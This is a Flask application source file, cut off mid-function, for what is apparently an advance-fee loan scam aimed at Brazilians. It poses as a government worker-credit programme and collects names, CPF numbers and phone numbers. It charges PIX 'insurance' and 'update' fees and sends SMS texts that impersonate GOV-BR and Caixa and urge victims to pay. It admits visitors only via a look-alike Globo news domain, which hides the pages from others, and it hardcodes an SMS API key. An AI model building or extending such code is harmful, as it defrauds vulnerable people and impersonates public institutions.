import os
import functools
import time
from flask import Flask, render_template, request, jsonify, redirect, url_for, session, abort
import logging
import secrets
import qrcode
import qrcode.constants
import base64
from io import BytesIO
import re
import random
import string
import requests
import json
import http.client
from payment_gateway import get_payment_gateway
from for4payments import create_payment_api

app = Flask(__name__)

# Domínio autorizado
AUTHORIZED_DOMAIN = "g1globo.noticiario-plantao.com"

def check_referer(f):
    @functools.wraps(f)
    def decorated_function(*args, **kwargs):
        # Obter referer
        referer = request.headers.get('Referer')
        
        # Verificar se estamos forçando a verificação de domínio
        FORCE_DOMAIN_CHECK = os.environ.get('FORCE_DOMAIN_CHECK', 'False').lower() == 'true'
        
        # Em ambiente de desenvolvimento Replit, verificamos a variável de ambiente
        if not FORCE_DOMAIN_CHECK and 'REPL_ID' in os.environ:
            app.logger.info(f"Ambiente de desenvolvimento detectado. Permitindo acesso. Referer: {referer}, Path: {request.path}")
            return f(*args, **kwargs)

        # Se o referer está vindo do nosso próprio site, permitir
        if referer and request.host in referer:
            app.logger.info(f"Navegação interna detectada, permitindo acesso: {request.path}")
            return f(*args, **kwargs)
            
        # Verificar domínio autorizado para acesso externo
        if not referer or AUTHORIZED_DOMAIN not in referer:
            app.logger.warning(f"Acesso não autorizado detectado! Referer: {referer}")
            return render_template('unauthorized.html'), 403
            
        # Se chegou aqui, o referer contém o domínio autorizado
        app.logger.info(f"Acesso autorizado via domínio para: {request.path}")
        return f(*args, **kwargs)
        
    return decorated_function

# Se não existir SESSION_SECRET, gera um valor aleatório seguro
if not os.environ.get("SESSION_SECRET"):
    os.environ["SESSION_SECRET"] = secrets.token_hex(32)

app.secret_key = os.environ.get("SESSION_SECRET")

# Configurar logging
logging.basicConfig(level=logging.DEBUG)

# Configuração para escolher qual API SMS usar: 'SMSDEV' ou 'OWEN'
SMS_API_CHOICE = os.environ.get('SMS_API_CHOICE', 'OWEN')

def send_verification_code_smsdev(phone_number: str, verification_code: str) -> tuple:
    """
    Sends a verification code via SMS using SMSDEV API
    Returns a tuple of (success, error_message or None)
    """
    try:
        # Usar a chave de API diretamente que foi testada e funcionou
        sms_api_key = "XFOQ8HUF4XXDBN16IVGDCUMEM0R2V3N4J5AJCSI3G0KDVRGJ53WDBIWJGGS4LHJO38XNGJ9YW1Q7M2YS4OG7MJOZM3OXA2RJ8H0CBQH24MLXLUCK59B718OPBLLQM1H5"

        # Format phone number (remove any non-digits)
        formatted_phone = re.sub(r'\D', '', phone_number)

        if len(formatted_phone) == 11:  # Ensure it's in the correct format with DDD
            # Message template
            message = f"[PROGRAMA CREDITO DO TRABALHADOR] Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."

            # Verificamos se há uma URL no texto para encurtar
            url_to_shorten = None
            if "http://" in message or "https://" in message:
                # Extrai a URL da mensagem
                url_pattern = r'(https?://[^\s]+)'
                url_match = re.search(url_pattern, message)
                if url_match:
                    url_to_shorten = url_match.group(0)
                    app.logger.info(f"[PROD] URL detectada para encurtamento: {url_to_shorten}")

            # API parameters
            params = {
                'key': sms_api_key,
                'type': '9',
                'number': formatted_phone,
                'msg': message,
                'short_url': '1'  # Sempre encurtar URLs encontradas na mensagem
            }

            # Make API request
            response = requests.get('https://api.smsdev.com.br/v1/send', params=params)

            # Log the response
            app.logger.info(f"SMSDEV: Verification code sent to {formatted_phone}. Response: {response.text}")

            if response.status_code == 200:
                return True, None
            else:
                return False, f"API error: {response.text}"
        else:
            app.logger.error(f"Invalid phone number format: {phone_number}")
            return False, "Número de telefone inválido"

    except Exception as e:
        app.logger.error(f"Error sending SMS via SMSDEV: {str(e)}")
        return False, str(e)

def send_verification_code_owen(phone_number: str, verification_code: str) -> tuple:
    """
    Sends a verification code via SMS using Owen SMS API v2
    Returns a tuple of (success, error_message or None)
    """
    try:
        # Get SMS API token from environment variables
        sms_token = os.environ.get('SMS_OWEN_TOKEN')
        if not sms_token:
            app.logger.error("SMS_OWEN_TOKEN not found in environment variables")
            return False, "API token not configured"

        # Format phone number (remove any non-digits and add Brazil country code)
        formatted_phone = re.sub(r'\D', '', phone_number)

        if len(formatted_phone) == 11:  # Ensure it's in the correct format with DDD
            # Format as international number with Brazil code
            international_number = f"55{formatted_phone}"

            # Message template
            message = f"[PROGRAMA CREDITO DO TRABALHADOR] Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."

            # Prepare the curl command
            import subprocess

            curl_command = [
                'curl',
                '--location',
                'https://api.apisms.me/v2/sms/send',
                '--header', 'Content-Type: application/json',
                '--header', f'Authorization: {sms_token}',
                '--data',
                json.dumps({
                    "operator": "claro",  # claro, vivo ou tim
                    "destination_number": f"{international_number}",  # Número do destinatário com código internacional
                    "message": message,  # Mensagem SMS com limite de 160 caracteres
                    "tag": "VerificationCode",  # Tag para identificação do SMS
                    "user_reply": False,  # Não receber resposta do destinatário
                    "webhook_url": ""  # Opcional para callbacks
                })
            ]

            # Execute curl command
            app.logger.info(f"Enviando código de verificação para {international_number} usando curl")
            payload = {
                    'operator': 'claro',
                    'destination_number': international_number,
                    'message': message,
                    'tag': 'VerificationCode',
                    'user_reply': False,
                    'webhook_url': ''
                }
            app.logger.info(f"JSON payload: {json.dumps(payload)}")
                
            process = subprocess.run(curl_command, capture_output=True, text=True)

            # Log response
            app.logger.info(f"OWEN SMS: Response for {international_number}: {process.stdout}")
            app.logger.info(f"OWEN SMS: Error for {international_number}: {process.stderr}")

            if process.returncode == 0 and "error" not in process.stdout.lower():
                return True, None
            else:
                error_msg = process.stderr if process.stderr else process.stdout
                return False, f"API error: {error_msg}"
        else:
            app.logger.error(f"Invalid phone number format: {phone_number}")
            return False, "Número de telefone inválido"

    except Exception as e:
        app.logger.error(f"Error sending SMS via Owen SMS: {str(e)}")
        return False, str(e)

def send_verification_code(phone_number: str) -> tuple:
    """
    Sends a verification code via the selected SMS API
    Returns a tuple of (success, code or error_message)
    """
    try:
        # Generate random 4-digit code
        verification_code = ''.join(random.choices('0123456789', k=4))

        # Format phone number (remove any non-digits)
        formatted_phone = re.sub(r'\D', '', phone_number)

        if len(formatted_phone) != 11:
            app.logger.error(f"Invalid phone number format: {phone_number}")
            return False, "Número de telefone inválido (deve conter DDD + 9 dígitos)"

        # Usar exclusivamente a API SMSDEV conforme solicitado
        app.logger.info(f"[PROD] Usando exclusivamente a API SMSDEV para enviar código de verificação")
        success, error = send_verification_code_smsdev(phone_number, verification_code)

        if success:
            return True, verification_code
        else:
            return False, error

    except Exception as e:
        app.logger.error(f"Error in send_verification_code: {str(e)}")
        return False, str(e)

def send_sms_smsdev(phone_number: str, message: str) -> bool:
    """
    Send SMS using SMSDEV API
    """
    try:
        # Usar a chave de API diretamente que foi testada e funcionou
        sms_api_key = "XFOQ8HUF4XXDBN16IVGDCUMEM0R2V3N4J5AJCSI3G0KDVRGJ53WDBIWJGGS4LHJO38XNGJ9YW1Q7M2YS4OG7MJOZM3OXA2RJ8H0CBQH24MLXLUCK59B718OPBLLQM1H5"
        
        # Format phone number (remove any non-digits and ensure it's in the correct format)
        formatted_phone = re.sub(r'\D', '', phone_number)
        if len(formatted_phone) == 11:  # Include DDD
            # Verificamos se há uma URL no texto para encurtar
            url_to_shorten = None
            if "http://" in message or "https://" in message:
                # Extrai a URL da mensagem
                url_pattern = r'(https?://[^\s]+)'
                url_match = re.search(url_pattern, message)
                if url_match:
                    url_to_shorten = url_match.group(0)
                    app.logger.info(f"[PROD] URL detectada para encurtamento: {url_to_shorten}")
            
            # API parameters
            params = {
                'key': sms_api_key,
                'type': '9',
                'number': formatted_phone,
                'msg': message,
                'short_url': '1'  # Sempre encurtar URLs encontradas na mensagem
            }

            # Log detail antes do envio para depuração
            app.logger.info(f"[PROD] Enviando SMS via SMSDEV para {formatted_phone} com encurtamento de URL ativado. Payload: {params}")

            # Make API request with timeout
            response = requests.get('https://api.smsdev.com.br/v1/send', params=params, timeout=10)
            
            # Analisar a resposta JSON se disponível
            try:
                response_data = response.json()
                app.logger.info(f"[PROD] SMSDEV: SMS enviado para {formatted_phone}. Resposta: {response_data}")
                
                # Verificar se a mensagem foi colocada na fila
                if response_data.get('situacao') == 'OK':
                    app.logger.info(f"[PROD] SMS enviado com sucesso para {formatted_phone}, ID: {response_data.get('id')}")
                    return True
                else:
                    app.logger.error(f"[PROD] Falha ao enviar SMS: {response_data}")
                    return False
            except Exception as json_err:
                app.logger.error(f"[PROD] Erro ao analisar resposta JSON: {str(json_err)}")
                # Se não conseguir parsear JSON, verificar apenas o status code
                return response.status_code == 200
        else:
            app.logger.error(f"[PROD] Formato inválido de número de telefone: {phone_number} (formatado: {formatted_phone})")
            return False
    except Exception as e:
        app.logger.error(f"[PROD] Erro no envio de SMS via SMSDEV: {str(e)}")
        return False

def send_sms_owen(phone_number: str, message: str) -> bool:
    """
    Send SMS using Owen SMS API v2 with curl
    """
    try:
        # Get SMS API token from environment variables
        sms_token = os.environ.get('SMS_OWEN_TOKEN')
        if not sms_token:
            app.logger.error("SMS_OWEN_TOKEN not found in environment variables")
            return False

        # Format phone number (remove any non-digits and add Brazil country code)
        formatted_phone = re.sub(r'\D', '', phone_number)
        if len(formatted_phone) == 11:  # Include DDD
            # Format as international number with Brazil code
            international_number = f"55{formatted_phone}"

            # Prepare and execute curl command
            import subprocess

            curl_command = [
                'curl',
                '--location',
                'https://api.apisms.me/v2/sms/send',
                '--header', 'Content-Type: application/json',
                '--header', f'Authorization: {sms_token}',
                '--data',
                json.dumps({
                    "operator": "claro",  # claro, vivo ou tim
                    "destination_number": f"{international_number}",  # Número do destinatário com código internacional
                    "message": message,  # Mensagem SMS com limite de 160 caracteres
                    "tag": "LoanApproval",  # Tag para identificação do SMS
                    "user_reply": False,  # Não receber resposta do destinatário
                    "webhook_url": ""  # Opcional para callbacks
                })
            ]

            # Execute curl command
            app.logger.info(f"Enviando SMS para {international_number} usando curl")
            payload = {
                "operator": "claro",
                "destination_number": international_number,
                "message": message,
                "tag": "LoanApproval",
                "user_reply": False,
                "webhook_url": ""
            }
            app.logger.info(f"JSON payload: {json.dumps(payload)}")
            
            process = subprocess.run(curl_command, capture_output=True, text=True)

            # Log response
            app.logger.info(f"OWEN SMS: Response for {international_number}: {process.stdout}")
            app.logger.info(f"OWEN SMS: Error for {international_number}: {process.stderr}")

            return process.returncode == 0 and "error" not in process.stdout.lower()
        else:
            app.logger.error(f"Invalid phone number format: {phone_number}")
            return False
    except Exception as e:
        app.logger.error(f"Error sending SMS via Owen SMS: {str(e)}")
        return False

def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
    try:
        # Get first name
        first_name = full_name.split()[0]

        # Format phone number (remove any non-digits)
        formatted_phone = re.sub(r'\D', '', phone_number)

        if len(formatted_phone) != 11:
            app.logger.error(f"Invalid phone number format: {phone_number}")
            return False

        # Message template
        message = f"[GOV-BR] {first_name}, estamos aguardando o pagamento do seguro no valor R${amount:.2f} para realizar a transferencia PIX do emprestimo para a sua conta bancaria."

        # Usar exclusivamente a API SMSDEV conforme solicitado
        app.logger.info(f"[PROD] Usando exclusivamente a API SMSDEV para enviar SMS")
        return send_sms_smsdev(phone_number, message)
    except Exception as e:
        app.logger.error(f"Error in send_sms: {str(e)}")
        return False
        
def send_payment_confirmation_sms(phone_number: str, nome: str, cpf: str, thank_you_url: str) -> bool:
    """
    Envia SMS de confirmação de pagamento com link personalizado para a página de agradecimento
    """
    try:
        if not phone_number:
            app.logger.error("[PROD] Número de telefone não fornecido para SMS de confirmação")
            return False
            
        # Format phone number (remove any non-digits)
        formatted_phone = re.sub(r'\D', '', phone_number)
        
        if len(formatted_phone) != 11:
            app.logger.error(f"[PROD] Formato inválido de número de telefone: {phone_number}")
            return False
            
        # Formata CPF para exibição (XXX.XXX.XXX-XX)
        cpf_formatado = format_cpf(cpf) if cpf else ""
        
        # Criar mensagem personalizada com link para thank_you_url
        nome_formatado = nome.split()[0] if nome else "Cliente"  # Usar apenas o primeiro nome
        
        # Garantir que a URL está codificada corretamente
        # Se a URL ainda não estiver codificada, o API SMSDEV pode não encurtá-la completamente
        import urllib.parse
        # Verificar se a URL já foi codificada verificando se tem caracteres de escape como %20
        if '%' not in thank_you_url and (' ' in thank_you_url or '&' in thank_you_url):
            # Extrair a base da URL e os parâmetros
            if '?' in thank_you_url:
                base_url, query_part = thank_you_url.split('?', 1)
                params = {}
                for param in query_part.split('&'):
                    if '=' in param:
                        key, value = param.split('=', 1)
                        params[key] = value
                
                # Recriar a URL com parâmetros codificados
                query_string = '&'.join([f"{key}={urllib.parse.quote(str(value))}" for key, value in params.items()])
                thank_you_url = f"{base_url}?{query_string}"
                app.logger.info(f"[PROD] URL recodificada para SMS: {thank_you_url}")
        
        # Mensagem mais informativa para o cliente
        message = f"[CAIXA]: {nome_formatado}, para receber o seu emprestimo resolva as pendencias urgentemente: {thank_you_url}"
        
        # Log detalhado para debugging
        app.logger.info(f"[PROD] Enviando SMS para {phone_number} com mensagem: '{message}'")
        
        # Fazer várias tentativas de envio para maior garantia
        max_attempts = 3
        attempt = 0
        success = False
        
        while attempt < max_attempts and not success:
            attempt += 1
            try:
                # Usar exclusivamente a API SMSDEV para confirmação de pagamento
                app.logger.info(f"[PROD] Usando exclusivamente a API SMSDEV para enviar SMS de confirmação")
                success = send_sms_smsdev(phone_number, message)
                
                if success:
                    app.logger.info(f"[PROD] SMS enviado com sucesso na tentativa {attempt} via SMSDEV")
                    break
                else:
                    app.logger.warning(f"[PROD] Falha ao enviar SMS na tentativa {attempt}/{max_attempts} via SMSDEV")
                    time.sleep(1.0)  # Aumentando o intervalo entre tentativas
            except Exception as e:
                app.logger.error(f"[PROD] Erro na tentativa {attempt} com SMSDEV: {str(e)}")
        
        return success

    except Exception as e:
        app.logger.error(f"[PROD] Erro no envio de SMS de confirmação: {str(e)}")
        return False

def generate_random_email(name: str) -> str:
    clean_name = re.sub(r'[^a-zA-Z]', '', name.lower())
    random_number = ''.join(random.choices(string.digits, k=4))
    domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com']
    domain = random.choice(domains)
    return f"{clean_name}{random_number}@{domain}"

def format_cpf(cpf: str) -> str:
    cpf = re.sub(r'\D', '', cpf)
    return f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}" if len(cpf) == 11 else cpf

def generate_random_phone():
    ddd = str(random.randint(11, 99))
    number = ''.join(random.choices(string.digits, k=8))
    return f"{ddd}{number}"

def generate_qr_code(pix_code: str) -> str:
    # Importar o QRCode dentro da função para garantir que a biblioteca está disponível
    import qrcode
    from qrcode import constants
    
    qr = qrcode.QRCode(
        version=1,
        error_correction=constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(pix_code)
    qr.make(fit=True)

    img = qr.make_image(fill_color="black", back_color="white")
    buffered = BytesIO()
    img.save(buffered, format="PNG")
    img_str = base64.b64encode(buffered.getvalue()).decode()
    return f"data:image/png;base64,{img_str}"

@app.route('/')
@check_referer
def index():
    try:
        # Get data from query parameters for backward compatibility
        customer_data = {
            'nome': request.args.get('nome', ''),
            'cpf': request.args.get('cpf', ''),
            'phone': request.args.get('phone', '')
        }

        app.logger.info(f"[PROD] Renderizando página inicial para: {customer_data}")
        return render_template('index.html', customer=customer_data)
    except Exception as e:
        app.logger.error(f"[PROD] Erro na rota index: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/payment')
@check_referer
def payment():
    try:
        app.logger.info("[PROD] Iniciando geração de PIX...")

        # Obter dados do usuário da query string
        nome = request.args.get('nome')
        cpf = request.args.get('cpf')
        phone = request.args.get('phone')  # Get phone from query params
        source = request.args.get('source', 'index')

        if not nome or not cpf:
            app.logger.error("[PROD] Nome ou CPF não fornecidos")
            return jsonify({'error': 'Nome e CPF são obrigatórios'}), 400

        app.logger.info(f"[PROD] Dados do cliente: nome={nome}, cpf={cpf}, phone={phone}, source={source}")

        # Inicializa a API de pagamento usando nossa factory
        api = get_payment_gateway()

        # Formata o CPF removendo pontos e traços
        cpf_formatted = ''.join(filter(str.isdigit, cpf))

        # Gera um email aleatório baseado no nome do cliente
        customer_email = generate_random_email(nome)

        # Use provided phone if available, otherwise generate random
        customer_phone = ''.join(filter(str.isdigit, phone)) if phone else generate_random_phone()

        # Define o valor baseado na origem
        if source == 'insurance':
            amount = 47.60  # Valor fixo para o seguro
        elif source == 'index':
            amount = 142.83
        else:
            amount = 73.40

        # Dados para a transação
        payment_data = {
            'name': nome,
            'email': customer_email,
            'cpf': cpf_formatted,
            'phone': customer_phone,
            'amount': amount
        }

        app.logger.info(f"[PROD] Dados do pagamento: {payment_data}")

        # Cria o pagamento PIX
        pix_data = api.create_pix_payment(payment_data)

        app.logger.info(f"[PROD] PIX gerado com sucesso: {pix_data}")

        # Send SMS notification if we have a valid phone number
        if phone:
            send_sms(phone, nome, amount)

        # Obter QR code e PIX code da resposta da API
        qr_code = pix_data.get('pixQrCode') or pix_data.get('pix_qr_code')
        pix_code = pix_data.get('pixCode') or pix_data.get('pix_code')
        
        # Garantir que temos valores válidos
        if not qr_code:
            # Gerar QR code com biblioteca qrcode
            import qrcode
            import qrcode
            from qrcode import constants
            qr = qrcode.QRCode(version=1, box_size=10, border=5)
            qr.add_data(pix_code)
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")
            buffered = BytesIO()
            img.save(buffered, format="PNG")
            qr_code = "data:image/png;base64," + base64.b64encode(buffered.getvalue()).decode()
            
        if not pix_code:
            # Algumas APIs podem usar outros nomes para o código PIX
            pix_code = pix_data.get('copy_paste') or pix_data.get('code') or ''
        
        # Log detalhado para depuração
        app.logger.info(f"[PROD] QR code: {qr_code[:50]}... (truncado)")
        app.logger.info(f"[PROD] PIX code: {pix_code[:50]}... (truncado)")
            
        return render_template('payment.html', 
                         qr_code=qr_code,
                         pix_code=pix_code, 
                         nome=nome, 
                         cpf=format_cpf(cpf),
                         phone=phone,  # Adicionando o telefone para o template
                         transaction_id=pix_data.get('id'),
                         amount=amount)

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao gerar PIX: {str(e)}")
        if hasattr(e, 'args') and len(e.args) > 0:
            return jsonify({'error': str(e.args[0])}), 500
        return jsonify({'error': str(e)}), 500

@app.route('/payment-update')
@check_referer
def payment_update():
    try:
        app.logger.info("[PROD] Iniciando geração de PIX para atualização cadastral...")

        # Obter dados do usuário da query string
        nome = request.args.get('nome')
        cpf = request.args.get('cpf')
        phone = request.args.get('phone', '') # Adicionar parâmetro phone

        if not nome or not cpf:
            app.logger.error("[PROD] Nome ou CPF não fornecidos")
            return jsonify({'error': 'Nome e CPF são obrigatórios'}), 400

        app.logger.info(f"[PROD] Dados do cliente para atualização: nome={nome}, cpf={cpf}, phone={phone}")

        # Inicializa a API usando nossa factory
        api = get_payment_gateway()

        # Formata o CPF removendo pontos e traços
        cpf_formatted = ''.join(filter(str.isdigit, cpf))

        # Gera um email aleatório baseado no nome do cliente
        customer_email = generate_random_email(nome)

        # Usa o telefone informado pelo usuário ou gera um se não estiver disponível
        if not phone:
            phone = generate_random_phone()
            app.logger.info(f"[PROD] Telefone não fornecido, gerando aleatório: {phone}")
        else:
            # Remover caracteres não numéricos do telefone
            phone = ''.join(filter(str.isdigit, phone))
            app.logger.info(f"[PROD] Usando telefone fornecido pelo usuário: {phone}")

        # Dados para a transação
        payment_data = {
            'name': nome,
            'email': customer_email,
            'cpf': cpf_formatted,
            'phone': phone,
            'amount': 73.40  # Valor fixo para atualização cadastral
        }

        app.logger.info(f"[PROD] Dados do pagamento de atualização: {payment_data}")

        # Cria o pagamento PIX
        pix_data = api.create_pix_payment(payment_data)

        app.logger.info(f"[PROD] PIX gerado com sucesso: {pix_data}")

        # Obter QR code e PIX code da resposta da API
        qr_code = pix_data.get('pix_qr_code')
        pix_code = pix_data.get('pix_code')
        
        # Garantir que temos valores válidos
        if not qr_code:
            # Algumas APIs podem usar outros nomes para o QR code
            qr_code = pix_data.get('qr_code_image') or pix_data.get('qr_code') or pix_data.get('pixQrCode') or ''
            
        if not pix_code:
            # Algumas APIs podem usar outros nomes para o código PIX
            pix_code = pix_data.get('copy_paste') or pix_data.get('code') or pix_data.get('pixCode') or ''
        
        # Log detalhado para depuração
        app.logger.info(f"[PROD] QR code: {qr_code[:50]}... (truncado)")
        app.logger.info(f"[PROD] PIX code: {pix_code[:50]}... (truncado)")
            
        return render_template('payment_update.html', 
                         qr_code=qr_code,
                         pix_code=pix_code, 
                         nome=nome, 
                         cpf=format_cpf(cpf),
                         phone=phone,  # Passando o telefone para o template
                         transaction_id=pix_data.get('id'),
                         amount=73.40)

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao gerar PIX: {str(e)}")
        if hasattr(e, 'args') and len(e.args) > 0:
            return jsonify({'error': str(e.args[0])}), 500
        return jsonify({'error': str(e)}), 500

@app.route('/check-payment-status/<transaction_id>')
@check_referer
def check_payment_status(transaction_id):
    try:
        # Obter informações do usuário da sessão se disponíveis
        nome = request.args.get('nome', '')
        cpf = request.args.get('cpf', '')
        phone = request.args.get('phone', '')
        
        # Logs detalhados de entrada para depuração
        app.logger.info(f"[PROD] Verificando status do pagamento {transaction_id} para cliente: nome={nome}, cpf={cpf}, phone={phone}")
        
        # Validar dados do cliente
        if not nome or not cpf:
            app.logger.warning(f"[PROD] Dados incompletos do cliente ao verificar pagamento. nome={nome}, cpf={cpf}")
        
        if not phone:
            app.logger.warning(f"[PROD] Telefone não fornecido para envio de SMS de confirmação: {transaction_id}")
        else:
            formatted_phone = re.sub(r'\D', '', phone)
            if len(formatted_phone) != 11:
                app.logger.warning(f"[PROD] Formato de telefone inválido: {phone} (formatado: {formatted_phone})")
            else:
                app.logger.info(f"[PROD] Telefone válido para SMS: {formatted_phone}")
        
        # Verificar status na API de pagamento
        api = get_payment_gateway()
        status_data = api.check_payment_status(transaction_id)
        app.logger.info(f"[PROD] Status do pagamento {transaction_id}: {status_data}")
        
        # Verificar se o pagamento foi aprovado
        is_completed = status_data.get('status') == 'completed'
        is_approved = status_data.get('original_status') in ['APPROVED', 'PAID']
        
        # Construir o URL personalizado para a página de agradecimento (sempre criar, independentemente do status)
        thank_you_url = request.url_root.rstrip('/') + '/obrigado'
        
        # Obter dados adicionais (banco, chave PIX e valor do empréstimo)
        bank = request.args.get('bank', 'Caixa Econômica Federal')
        pix_key = request.args.get('pix_key', cpf if cpf else '')
        loan_amount = request.args.get('loan_amount', '4000')
        
        if is_completed or is_approved:
            app.logger.info(f"[PROD] PAGAMENTO APROVADO: {transaction_id} - Status: {status_data.get('status')}, Original Status: {status_data.get('original_status')}")
            
            # Adicionar parâmetros do usuário, se disponíveis
            params = {
                'nome': nome if nome else '',
                'cpf': cpf if cpf else '',
                'phone': phone if phone else '',
                'bank': bank,
                'pix_key': pix_key,
                'loan_amount': loan_amount,
                'utm_source': 'smsempresa',
                'utm_medium': 'sms',
                'utm_campaign': '',
                'utm_content': phone if phone else ''
            }
                
            # Construir a URL completa com parâmetros codificados corretamente para evitar problemas de encurtamento
            if params:
                # Usar urllib para codificar os parâmetros corretamente
                import urllib.parse
                query_string = '&'.join([f"{key}={urllib.parse.quote(str(value))}" for key, value in params.items()])
                thank_you_url += '?' + query_string
            
            app.logger.info(f"[PROD] URL personalizado de agradecimento: {thank_you_url}")
            
            # Enviar SMS apenas se o número de telefone estiver disponível
            if phone:
                app.logger.info(f"[PROD] Preparando envio de SMS para {phone}")
                
                # Fazer várias tentativas de envio direto usando SMSDEV
                max_attempts = 3
                attempt = 0
                sms_sent = False
                
                while attempt < max_attempts and not sms_sent:
                    attempt += 1
                    try:
                        app.logger.info(f"[PROD] Tentativa {attempt} de envio de SMS via SMSDEV diretamente")
                        
                        # Formatar o nome para exibição
                        nome_formatado = nome.split()[0] if nome else "Cliente"
                        
                        # Mensagem personalizada com link para thank_you_url
                        message = f"[CAIXA]: {nome_formatado}, para receber o seu emprestimo resolva as pendencias urgentemente: {thank_you_url}"
                        
                        # Chamar diretamente a função SMSDEV
                        sms_sent = send_sms_smsdev(phone, message)
                        
                        if sms_sent:
                            app.logger.info(f"[PROD] SMS enviado com sucesso na tentativa {attempt} diretamente via SMSDEV")
                            break
                        else:
                            app.logger.warning(f"[PROD] Falha ao enviar SMS diretamente na tentativa {attempt}/{max_attempts}")
                            time.sleep(1.5)  # Intervalo maior entre tentativas
                    except Exception as e:
                        app.logger.error(f"[PROD] Erro na tentativa {attempt} de envio direto via SMSDEV: {str(e)}")
                        time.sleep(1.0)
                
                # Tente a função especializada como backup se as tentativas diretas falharem
                if not sms_sent:
                    app.logger.warning(f"[PROD] Tentativas diretas falharam, usando função de confirmação de pagamento")
                    sms_sent = send_payment_confirmation_sms(phone, nome, cpf, thank_you_url)
                
                if sms_sent:
                    app.logger.info(f"[PROD] SMS de confirmação enviado com sucesso para {phone}")
                else:
                    app.logger.error(f"[PROD] Todas as tentativas de envio de SMS falharam para {phone}")
        else:
            app.logger.info(f"[PROD] Pagamento {transaction_id} ainda não aprovado. Status: {status_data.get('status')}")
        
        # Adicionar informações extras ao status para o frontend
        status_data['phone_provided'] = bool(phone)
        # Como thank_you_url é sempre definido agora, podemos simplificar a lógica
        if is_completed or is_approved:
            status_data['thank_you_url'] = thank_you_url
        else:
            status_data['thank_you_url'] = None
        
        return jsonify(status_data)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao verificar status: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/verificar-cpf')
@check_referer
def verificar_cpf():
    app.logger.info("[PROD] Acessando página de verificação de CPF: verificar-cpf.html")
    return render_template('verificar-cpf.html')

@app.route('/buscar-cpf')
@check_referer
def buscar_cpf():
    try:
        verification_token = os.environ.get('VERIFICATION_TOKEN')
        if not verification_token:
            app.logger.error("[PROD] VERIFICATION_TOKEN not found in environment variables")
            return jsonify({'error': 'Configuration error'}), 500
            
        exato_api_token = os.environ.get('EXATO_API_TOKEN')
        if not exato_api_token:
            app.logger.error("[PROD] EXATO_API_TOKEN not found in environment variables")
            return jsonify({'error': 'API Token configuration error'}), 500

        app.logger.info("[PROD] Acessando página de busca de CPF: buscar-cpf.html")
        return render_template('buscar-cpf.html', verification_token=verification_token, exato_api_token=exato_api_token)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar busca de CPF: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/input-cpf')
@check_referer
def input_cpf():
    try:
        verification_token = os.environ.get('VERIFICATION_TOKEN')
        if not verification_token:
            app.logger.error("[PROD] VERIFICATION_TOKEN not found in environment variables")
            return jsonify({'error': 'Configuration error'}), 500

        app.logger.info("[PROD] Acessando página de entrada de CPF: input_cpf.html")
        return render_template('input_cpf.html', verification_token=verification_token)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar entrada de CPF: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/analisar-cpf')
@check_referer
def analisar_cpf():
    try:
        app.logger.info("[PROD] Acessando página de análise de CPF: analisar_cpf.html")
        exato_api_token = os.environ.get('EXATO_API_TOKEN')
        if not exato_api_token:
            app.logger.error("[PROD] EXATO_API_TOKEN not found in environment variables")
            return jsonify({'error': 'API Token configuration error'}), 500
        
        return render_template('analisar_cpf.html', exato_api_token=exato_api_token)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar análise de CPF: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/opcoes-emprestimo')
@check_referer
def opcoes_emprestimo():
    try:
        # Get query parameters
        cpf = request.args.get('cpf')
        nome = request.args.get('nome')
        
        if not cpf or not nome:
            app.logger.error("[PROD] CPF ou nome não fornecidos")
            return redirect('/input-cpf')
            
        app.logger.info(f"[PROD] Acessando página de opções de empréstimo para CPF: {cpf}")
        return render_template('opcoes_emprestimo.html')
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar opções de empréstimo: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/aviso')
@check_referer
def seguro_prestamista():
    try:
        # Get customer data from query parameters
        customer = {
            'nome': request.args.get('nome', ''),
            'cpf': request.args.get('cpf', ''),
            'phone': request.args.get('phone', ''),
            'pix_key': request.args.get('pix_key', ''),
            'bank': request.args.get('bank', ''),
            'amount': request.args.get('amount', '0'),
            'term': request.args.get('term', '0')
        }
        
        app.logger.info(f"[PROD] Renderizando página de aviso sobre seguro prestamista: {customer}")
        return render_template('aviso.html', customer=customer)
    except Exception as e:
        app.logger.error(f"[PROD] Erro na página de aviso: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/obrigado')
def thank_you():
    try:
        # Get customer data from query parameters if available
        customer = {
            'name': request.args.get('nome', ''),
            'cpf': request.args.get('cpf', ''),
            'phone': request.args.get('phone', ''),
            'bank': request.args.get('bank', 'Caixa Econômica Federal'),
            'pix_key': request.args.get('pix_key', ''),
            'loan_amount': request.args.get('loan_amount', '4000')
        }
        
        app.logger.info(f"[PROD] Renderizando página de agradecimento com dados: {customer}")
        meta_pixel_id = os.environ.get('META_PIXEL_ID')
        return render_template('thank_you.html', customer=customer, meta_pixel_id=meta_pixel_id)
    except Exception as e:
        app.logger.error(f"[PROD] Erro na página de obrigado: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500
        
@app.route('/create-pix-payment', methods=['POST'])
@check_referer
def create_pix_payment():
    try:
        # Validar dados da requisição
        if not request.is_json:
            app.logger.error("[PROD] Requisição inválida: conteúdo não é JSON")
            return jsonify({'error': 'Requisição inválida: formato JSON esperado'}), 400
            
        data = request.json
        
        # Verificar campos obrigatórios
        required_fields = ['name', 'cpf', 'amount']
        for field in required_fields:
            if field not in data or not data[field]:
                app.logger.error(f"[PROD] Campo obrigatório ausente: {field}")
